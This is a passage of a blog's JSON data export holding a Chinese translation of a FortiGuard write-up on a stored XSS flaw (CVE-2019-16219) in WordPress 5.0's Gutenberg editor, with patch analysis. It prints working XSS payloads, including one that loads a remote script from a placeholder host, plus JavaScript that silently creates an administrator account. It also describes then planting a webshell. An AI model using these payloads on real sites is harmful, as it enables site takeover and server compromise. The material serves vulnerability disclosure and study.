属性中source值为html，前端脚本不再解析&lt;\n\n原文链接：https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html","source":"_posts/wordpress5-xss.md","raw":"---\ntitle: 【翻译】浅析WordPress5.0存储型XSS漏洞\ndate: 2019-09-23 14:30:26\ntags: 翻译\ncategories: 技术\n\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n最近，笔者在研究一些与WordPress漏洞相关内容。Sucuri、RIPS、Fortinet等安全公司对WordPress有着一系列的深入研究，因此笔者计划陆续将一些有意思文章翻译出来，与大家共同学习下，祝君多挖漏洞。\n\n<!--more-->\n\n这篇文章是来自FortiGuard Labs，本文介绍了存在于wordpress5.0版本中的xss漏洞。经我个人验证，从wordpress5.0版本起，由于强制使用古腾堡(Gutenberg)编辑器，内部存在不少xss漏洞，而本文中的漏洞，一直存在至5.0.5版本，而非文中所说的5.0.4。\n\n下面翻译稿正文开始\n\n## 前言\n\nWordPress 是世界上最受欢迎的内容管理系统 （CMS），它的全球CMS市场份额已达60.4%，远远高于排名第二的Joomla！（后者仅有5.2%市场份额）。因此，互联网上超过三分之一的网站是使用WordPress搭建的。\n\n近日，FortiGuard Labs团队在 WordPress 中发现了一个存储型跨站点脚本 （XSS）0day漏洞。此 XSS 漏洞是由 WordPress 5.0 中的新内置编辑器 Gutenberg 引起的，编辑器无法过滤Shortcode错误消息中的 JavaScript/HTML 代码。一旦受害者访问受感染网页，具有投稿者（Contributor）或更高权限的远程攻击者就可以在其浏览器中执行任意 JavaScript/HTML 代码。倘若受害者具有较高权限（如：管理员），攻击者甚至可以攻陷整个 Web 服务器。\n\n此存储型XSS漏洞（[CVE-2019-16219](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219)）影响WordPress 5.0到[5.0.4,5.1](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219)和5.1.1版本。\n\n## 解析\n\n在WordPress 5.0中，用户可以将Shortcode块添加到帖子中。若将某些特定的HTML编码字符（如“＆lt;”）添加到短代码块中，重新打开该帖时，WordPress就会显示错误消息，并将“＆lt;”解码为“<”来进行预览。 \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141338-c948f9c4-db6d-1.png)\n\n图1.注入HTML编码字符Shortcode块\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141349-cf90eed6-db6d-1.png)\n\n图2.Shortcode错误消息预览\n\n使用PoC代码\n\n```\n\"&gt;&lt;img src=1 onerror=alert(\"熊本熊本熊\")&gt;\n```\n\n可以轻松绕过此预览中的XSS过滤器。 \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141406-d99b9ad4-db6d-1.png)\n\n图3.将PoC代码插入Shortcode块\n\n当受害者查看该帖时，XSS代码将在其浏览器中执行。 \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141415-df3c5a5a-db6d-1.png)\n\n图4. WordPress短代码预览XSS\n\n如果受害者恰好拥有管理员权限，攻击者即可以利用此漏洞获取管理员帐户的控制权，利用WordPress内置函数 getShell，然后控制服务器。\n\n例如，攻击者可以在其Web服务器上托管JavaScript文件，例如[wpaddadmin [。\\] js](https://g0blin.co.uk/xss-and-wordpress-the-aftermath/)（在链接中描述）。此JavaScript代码将添加一个WordPress管理员帐户，其用户名为“attacker”，密码为“attacker”。\n\n```javascript\n// Send a GET request to the URL '/wordpress/wp-admin/user-new.php', and extract the current 'nonce' value  \nvar ajaxRequest = new XMLHttpRequest();  \nvar requestURL = \"/wordpress/wp-admin/user-new.php\";  \nvar nonceRegex = /ser\" value=\"([^\"]*?)\"/g;  \najaxRequest.open(\"GET\", requestURL, false);  \najaxRequest.send();  \nvar nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  \nvar nonce = nonceMatch[1];  \n\n// Construct a POST query, using the previously extracted 'nonce' value, and create a new user with an arbitrary username / password, as an Administrator  \nvar params = \"action=createuser&_wpnonce_create-user=\"+nonce+\"&user_login=attacker&email=attacker@site.com&pass1=attacker&pass2=attacker&role=administrator\";  \najaxRequest = new XMLHttpRequest();  \najaxRequest.open(\"POST\", requestURL, true);  \najaxRequest.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");  \najaxRequest.send(params);\n```\n\n然后，攻击者可以在JavaScript中注入以下PoC代码。\n\n```\n\"&gt;&lt;img src=1 onerror=\"javascript&colon;(function () { var url = 'http://aaa.bbb.ccc.ddd/ wpaddadmin.js';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();\"&gt;\n```\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141432-e97fa756-db6d-1.png)\n\n图5.注入XSS代码以添加管理员帐户\n\n一旦具有高权限的受害者查看此帖，就会立即创建attacker管理员帐户。 \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141451-f476286a-db6d-1.png)\n\n图6.执行XSS代码\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141504-fcb25f76-db6d-1.png)\n\n图7.使用XSS代码，成功创建具有管理员权限的“attacker”帐户\n\n随之，攻击者可以将现有的php文件修改为webshell，并借此来控制Web服务器。 \n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141516-038c2df4-db6e-1.png)\n\n图8.使用攻击者的帐户添加webshell\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141526-09a274fa-db6e-1.png)\n\n图9.控制Web服务器\n\n## 解决方案\n\n建议使用受影响版本的WordPress用户，尽快升级到最新版本或立即应用最新的补丁。\n\n翻译正文到此结束\n\n## 写在翻译稿后面\n\n我跟踪了下wordpress的修复\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141538-10bb5d88-db6e-1.png)\n\n本次都修复位于wp-includes\\js\\dist\\block-library.js中\n\n由于原先shortcode的*attributes* 属性中source值为'text'，前端页面在解析shortcode中的&lt;值时，会将其解析为<,从而造成闭合，如下图\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190920141547-15d8ea92-db6e-1.png)\n\n修复后shortcode的*attributes* 属性中source值为html，前端脚本不再解析&lt;\n\n原文链接：https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html","slug":"wordpress5-xss","published":1,"updated":"2020-10-27T09:27:09.859Z","_id":"ckgrozua9005pwsa92hxxbgeh","comments":1,"layout":"post","photos":[],"link":"","content":"<p>最近，笔者在研究一些与WordPress漏洞相关内容。Sucuri、RIPS、Fortinet等安全公司对WordPress有着一系列的深入研究，因此笔者计划陆续将一些有意思文章翻译出来，与大家共同学习下，祝君多挖漏洞。</p>\n<a id=\"more\"></a>\n\n<p>这篇文章是来自FortiGuard Labs，本文介绍了存在于wordpress5.0版本中的xss漏洞。经我个人验证，从wordpress5.0版本起，由于强制使用古腾堡(Gutenberg)编辑器，内部存在不少xss漏洞，而本文中的漏洞，一直存在至5.0.5版本，而非文中所说的5.0.4。</p>\n<p>下面翻译稿正文开始</p>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>WordPress 是世界上最受欢迎的内容管理系统 （CMS），它的全球CMS市场份额已达60.4%，远远高于排名第二的Joomla！（后者仅有5.2%市场份额）。因此，互联网上超过三分之一的网站是使用WordPress搭建的。</p>\n<p>近日，FortiGuard Labs团队在 WordPress 中发现了一个存储型跨站点脚本 （XSS）0day漏洞。此 XSS 漏洞是由 WordPress 5.0 中的新内置编辑器 Gutenberg 引起的，编辑器无法过滤Shortcode错误消息中的 JavaScript/HTML 代码。一旦受害者访问受感染网页，具有投稿者（Contributor）或更高权限的远程攻击者就可以在其浏览器中执行任意 JavaScript/HTML 代码。倘若受害者具有较高权限（如：管理员），攻击者甚至可以攻陷整个 Web 服务器。</p>\n<p>此存储型XSS漏洞（<a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219\">CVE-2019-16219</a>）影响WordPress 5.0到<a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219\">5.0.4,5.1</a>和5.1.1版本。</p>\n<h2 id=\"解析\"><a href=\"#解析\" class=\"headerlink\" title=\"解析\"></a>解析</h2><p>在WordPress 5.0中，用户可以将Shortcode块添加到帖子中。若将某些特定的HTML编码字符（如“＆lt;”）添加到短代码块中，重新打开该帖时，WordPress就会显示错误消息，并将“＆lt;”解码为“&lt;”来进行预览。 </p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141338-c948f9c4-db6d-1.png\"></p>\n<p>图1.注入HTML编码字符Shortcode块</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141349-cf90eed6-db6d-1.png\"></p>\n<p>图2.Shortcode错误消息预览</p>\n<p>使用PoC代码</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;<span class=\"symbol\">&amp;gt;</span><span class=\"symbol\">&amp;lt;</span>img src=1 onerror=alert(&quot;熊本熊本熊&quot;)<span class=\"symbol\">&amp;gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>可以轻松绕过此预览中的XSS过滤器。 </p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141406-d99b9ad4-db6d-1.png\"></p>\n<p>图3.将PoC代码插入Shortcode块</p>\n<p>当受害者查看该帖时，XSS代码将在其浏览器中执行。 </p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141415-df3c5a5a-db6d-1.png\"></p>\n<p>图4. WordPress短代码预览XSS</p>\n<p>如果受害者恰好拥有管理员权限，攻击者即可以利用此漏洞获取管理员帐户的控制权，利用WordPress内置函数 getShell，然后控制服务器。</p>\n<p>例如，攻击者可以在其Web服务器上托管JavaScript文件，例如[wpaddadmin <a href=\"https://g0blin.co.uk/xss-and-wordpress-the-aftermath/\">。] js</a>（在链接中描述）。此JavaScript代码将添加一个WordPress管理员帐户，其用户名为“attacker”，密码为“attacker”。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Send a GET request to the URL &#x27;/wordpress/wp-admin/user-new.php&#x27;, and extract the current &#x27;nonce&#x27; value  </span></span><br><span class=\"line\"><span class=\"keyword\">var</span> ajaxRequest = <span class=\"keyword\">new</span> XMLHttpRequest();  </span><br><span class=\"line\"><span class=\"keyword\">var</span> requestURL = <span class=\"string\">&quot;/wordpress/wp-admin/user-new.php&quot;</span>;  </span><br><span class=\"line\"><span class=\"keyword\">var</span> nonceRegex = <span class=\"regexp\">/ser&quot; value=&quot;([^&quot;]*?)&quot;/g</span>;  </span><br><span class=\"line\">ajaxRequest.open(<span class=\"string\">&quot;GET&quot;</span>, requestURL, <span class=\"literal\">false</span>);  </span><br><span class=\"line\">ajaxRequest.send();  </span><br><span class=\"line\"><span class=\"keyword\">var</span> nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  </span><br><span class=\"line\"><span class=\"keyword\">var</span> nonce = nonceMatch[<span class=\"number\">1</span>];  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Construct a POST query, using the previously extracted &#x27;nonce&#x27; value, and create a new user with an arbitrary username / password, as an Administrator  </span></span><br><span class=\"line\"><span class=\"keyword\">var</span> params = <span class=\"string\">&quot;action=createuser&amp;_wpnonce_create-user=&quot;</span>+nonce+<span class=\"string\">&quot;&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator&quot;</span>;  </span><br><span class=\"line\">ajaxRequest = <span class=\"keyword\">new</span> XMLHttpRequest();  </span><br><span class=\"line\">ajaxRequest.open(<span class=\"string\">&quot;POST&quot;</span>, requestURL, <span class=\"literal\">true</span>);  </span><br><span class=\"line\">ajaxRequest.setRequestHeader(<span class=\"string\">&quot;Content-Type&quot;</span>, <span class=\"string\">&quot;application/x-www-form-urlencoded&quot;</span>);  </span><br><span class=\"line\">ajaxRequest.send(params);</span><br></pre></td></tr></table></figure>\n\n<p>然后，攻击者可以在JavaScript中注入以下PoC代码。</p>\n<figure class=\"highlight qml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&amp;gt;&amp;lt;img src=1 onerror=&quot;</span>javascript&amp;colon;(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; <span class=\"keyword\">var</span> <span class=\"built_in\">url</span> = <span class=\"string\">&#x27;http://aaa.bbb.ccc.ddd/ wpaddadmin.js&#x27;</span>;<span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> beef == <span class=\"string\">&#x27;undefined&#x27;</span>) &#123; <span class=\"keyword\">var</span> bf = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">&#x27;script&#x27;</span>); bf.type = <span class=\"string\">&#x27;text/javascript&#x27;</span>; bf.src = <span class=\"built_in\">url</span>; <span class=\"built_in\">document</span>.body.appendChild(bf);&#125;&#125;)();<span class=\"string\">&quot;&amp;gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141432-e97fa756-db6d-1.png\"></p>\n<p>图5.注入XSS代码以添加管理员帐户</p>\n<p>一旦具有高权限的受害者查看此帖，就会立即创建attacker管理员帐户。 </p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141451-f476286a-db6d-1.png\"></p>\n<p>图6.执行XSS代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141504-fcb25f76-db6d-1.png\"></p>\n<p>图7.使用XSS代码，成功创建具有管理员权限的“attacker”帐户</p>\n<p>随之，攻击者可以将现有的php文件修改为webshell，并借此来控制Web服务器。 </p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141516-038c2df4-db6e-1.png\"></p>\n<p>图8.使用攻击者的帐户添加webshell</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141526-09a274fa-db6e-1.png\"></p>\n<p>图9.控制Web服务器</p>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><p>建议使用受影响版本的WordPress用户，尽快升级到最新版本或立即应用最新的补丁。</p>\n<p>翻译正文到此结束</p>\n<h2 id=\"写在翻译稿后面\"><a href=\"#写在翻译稿后面\" class=\"headerlink\" title=\"写在翻译稿后面\"></a>写在翻译稿后面</h2><p>我跟踪了下wordpress的修复</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141538-10bb5d88-db6e-1.png\"></p>\n<p>本次都修复位于wp-includes\\js\\dist\\block-library.js中</p>\n<p>由于原先shortcode的<em>attributes</em> 属性中source值为’text’，前端页面在解析shortcode中的&lt;值时，会将其解析为&lt;,从而造成闭合，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141547-15d8ea92-db6e-1.png\"></p>\n<p>修复后shortcode的<em>attributes</em> 属性中source值为html，前端脚本不再解析&lt;</p>\n<p>原文链接：<a href=\"https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html\">https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html</a></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/江博士带你轻松搞定KVM虚拟化.jpg","excerpt":"<p>最近，笔者在研究一些与WordPress漏洞相关内容。Sucuri、RIPS、Fortinet等安全公司对WordPress有着一系列的深入研究，因此笔者计划陆续将一些有意思文章翻译出来，与大家共同学习下，祝君多挖漏洞。</p>","more":"<p>这篇文章是来自FortiGuard Labs，本文介绍了存在于wordpress5.0版本中的xss漏洞。经我个人验证，从wordpress5.0版本起，由于强制使用古腾堡(Gutenberg)编辑器，内部存在不少xss漏洞，而本文中的漏洞，一直存在至5.0.5版本，而非文中所说的5.0.4。</p>\n<p>下面翻译稿正文开始</p>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>WordPress 是世界上最受欢迎的内容管理系统 （CMS），它的全球CMS市场份额已达60.4%，远远高于排名第二的Joomla！（后者仅有5.2%市场份额）。因此，互联网上超过三分之一的网站是使用WordPress搭建的。</p>\n<p>近日，FortiGuard Labs团队在 WordPress 中发现了一个存储型跨站点脚本 （XSS）0day漏洞。此 XSS 漏洞是由 WordPress 5.0 中的新内置编辑器 Gutenberg 引起的，编辑器无法过滤Shortcode错误消息中的 JavaScript/HTML 代码。一旦受害者访问受感染网页，具有投稿者（Contributor）或更高权限的远程攻击者就可以在其浏览器中执行任意 JavaScript/HTML 代码。倘若受害者具有较高权限（如：管理员），攻击者甚至可以攻陷整个 Web 服务器。</p>\n<p>此存储型XSS漏洞（<a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219\">CVE-2019-16219</a>）影响WordPress 5.0到<a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219\">5.0.4,5.1</a>和5.1.1版本。</p>\n<h2 id=\"解析\"><a href=\"#解析\" class=\"headerlink\" title=\"解析\"></a>解析</h2><p>在WordPress 5.0中，用户可以将Shortcode块添加到帖子中。若将某些特定的HTML编码字符（如“＆lt;”）添加到短代码块中，重新打开该帖时，WordPress就会显示错误消息，并将“＆lt;”解码为“&lt;”来进行预览。 </p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141338-c948f9c4-db6d-1.png\"></p>\n<p>图1.注入HTML编码字符Shortcode块</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141349-cf90eed6-db6d-1.png\"></p>\n<p>图2.Shortcode错误消息预览</p>\n<p>使用PoC代码</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;<span class=\"symbol\">&amp;gt;</span><span class=\"symbol\">&amp;lt;</span>img src=1 onerror=alert(&quot;熊本熊本熊&quot;)<span class=\"symbol\">&amp;gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>可以轻松绕过此预览中的XSS过滤器。 </p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141406-d99b9ad4-db6d-1.png\"></p>\n<p>图3.将PoC代码插入Shortcode块</p>\n<p>当受害者查看该帖时，XSS代码将在其浏览器中执行。 </p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141415-df3c5a5a-db6d-1.png\"></p>\n<p>图4. WordPress短代码预览XSS</p>\n<p>如果受害者恰好拥有管理员权限，攻击者即可以利用此漏洞获取管理员帐户的控制权，利用WordPress内置函数 getShell，然后控制服务器。</p>\n<p>例如，攻击者可以在其Web服务器上托管JavaScript文件，例如[wpaddadmin <a href=\"https://g0blin.co.uk/xss-and-wordpress-the-aftermath/\">。] js</a>（在链接中描述）。此JavaScript代码将添加一个WordPress管理员帐户，其用户名为“attacker”，密码为“attacker”。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Send a GET request to the URL &#x27;/wordpress/wp-admin/user-new.php&#x27;, and extract the current &#x27;nonce&#x27; value  </span></span><br><span class=\"line\"><span class=\"keyword\">var</span> ajaxRequest = <span class=\"keyword\">new</span> XMLHttpRequest();  </span><br><span class=\"line\"><span class=\"keyword\">var</span> requestURL = <span class=\"string\">&quot;/wordpress/wp-admin/user-new.php&quot;</span>;  </span><br><span class=\"line\"><span class=\"keyword\">var</span> nonceRegex = <span class=\"regexp\">/ser&quot; value=&quot;([^&quot;]*?)&quot;/g</span>;  </span><br><span class=\"line\">ajaxRequest.open(<span class=\"string\">&quot;GET&quot;</span>, requestURL, <span class=\"literal\">false</span>);  </span><br><span class=\"line\">ajaxRequest.send();  </span><br><span class=\"line\"><span class=\"keyword\">var</span> nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  </span><br><span class=\"line\"><span class=\"keyword\">var</span> nonce = nonceMatch[<span class=\"number\">1</span>];  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Construct a POST query, using the previously extracted &#x27;nonce&#x27; value, and create a new user with an arbitrary username / password, as an Administrator  </span></span><br><span class=\"line\"><span class=\"keyword\">var</span> params = <span class=\"string\">&quot;action=createuser&amp;_wpnonce_create-user=&quot;</span>+nonce+<span class=\"string\">&quot;&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator&quot;</span>;  </span><br><span class=\"line\">ajaxRequest = <span class=\"keyword\">new</span> XMLHttpRequest();  </span><br><span class=\"line\">ajaxRequest.open(<span class=\"string\">&quot;POST&quot;</span>, requestURL, <span class=\"literal\">true</span>);  </span><br><span class=\"line\">ajaxRequest.setRequestHeader(<span class=\"string\">&quot;Content-Type&quot;</span>, <span class=\"string\">&quot;application/x-www-form-urlencoded&quot;</span>);  </span><br><span class=\"line\">ajaxRequest.send(params);</span><br></pre></td></tr></table></figure>\n\n<p>然后，攻击者可以在JavaScript中注入以下PoC代码。</p>\n<figure class=\"highlight qml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&amp;gt;&amp;lt;img src=1 onerror=&quot;</span>javascript&amp;colon;(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; <span class=\"keyword\">var</span> <span class=\"built_in\">url</span> = <span class=\"string\">&#x27;http://aaa.bbb.ccc.ddd/ wpaddadmin.js&#x27;</span>;<span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> beef == <span class=\"string\">&#x27;undefined&#x27;</span>) &#123; <span class=\"keyword\">var</span> bf = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">&#x27;script&#x27;</span>); bf.type = <span class=\"string\">&#x27;text/javascript&#x27;</span>; bf.src = <span class=\"built_in\">url</span>; <span class=\"built_in\">document</span>.body.appendChild(bf);&#125;&#125;)();<span class=\"string\">&quot;&amp;gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141432-e97fa756-db6d-1.png\"></p>\n<p>图5.注入XSS代码以添加管理员帐户</p>\n<p>一旦具有高权限的受害者查看此帖，就会立即创建attacker管理员帐户。 </p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141451-f476286a-db6d-1.png\"></p>\n<p>图6.执行XSS代码</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141504-fcb25f76-db6d-1.png\"></p>\n<p>图7.使用XSS代码，成功创建具有管理员权限的“attacker”帐户</p>\n<p>随之，攻击者可以将现有的php文件修改为webshell，并借此来控制Web服务器。 </p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141516-038c2df4-db6e-1.png\"></p>\n<p>图8.使用攻击者的帐户添加webshell</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141526-09a274fa-db6e-1.png\"></p>\n<p>图9.控制Web服务器</p>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><p>建议使用受影响版本的WordPress用户，尽快升级到最新版本或立即应用最新的补丁。</p>\n<p>翻译正文到此结束</p>\n<h2 id=\"写在翻译稿后面\"><a href=\"#写在翻译稿后面\" class=\"headerlink\" title=\"写在翻译稿后面\"></a>写在翻译稿后面</h2><p>我跟踪了下wordpress的修复</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141538-10bb5d88-db6e-1.png\"></p>\n<p>本次都修复位于wp-includes\\js\\dist\\block-library.js中</p>\n<p>由于原先shortcode的<em>attributes</em> 属性中source值为’text’，前端页面在解析shortcode中的&lt;值时，会将其解析为&lt;,从而造成闭合，如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190920141547-15d8ea92-db6e-1.png\"></p>\n<p>修复后shortcode的<em>attributes</em> 属性中source值为html，前端脚本不再解析&lt;</p>\n<p>原文链接：<a href=\"https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html\">https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html</a></p>"},{"title":"阿里白帽大会留念","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/gCyqJiO5lRrkYTB.webp","date":"2020-01-13T09:32:24.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n# 阿里白帽大会留念\n\n![wJDdtx.jpg](https://s1.ax1x.com/2020/09/10/wJDdtx.jpg)\n\n\n\n![wJrPb9.jpg](https://s1.ax1x.com/2020/09/10/wJrPb9.jpg)\n\n\n\n![wJr9u4.jpg](https://s1.ax1x.com/2020/09/10/wJr9u4.jpg)","source":"_posts/xianzhidahui.md","raw":"---\ntitle: 阿里白帽大会留念\ntags: 杂文\ncategories: 日常\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/gCyqJiO5lRrkYTB.webp\ndate: 2020-01-13 17:32:24\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n# 阿里白帽大会留念\n\n![wJDdtx.jpg](https://s1.ax1x.com/2020/09/10/wJDdtx.jpg)\n\n\n\n![wJrPb9.jpg](https://s1.ax1x.com/2020/09/10/wJrPb9.jpg)\n\n\n\n![wJr9u4.jpg](https://s1.ax1x.com/2020/09/10/wJr9u4.jpg)","slug":"xianzhidahui","published":1,"updated":"2020-10-27T09:25:30.013Z","_id":"ckgrozuaa005swsa9a6bm4bi9","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"阿里白帽大会留念\"><a href=\"#阿里白帽大会留念\" class=\"headerlink\" title=\"阿里白帽大会留念\"></a>阿里白帽大会留念</h1><p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/09/10/wJDdtx.jpg\" alt=\"wJDdtx.jpg\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/09/10/wJrPb9.jpg\" alt=\"wJrPb9.jpg\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/09/10/wJr9u4.jpg\" 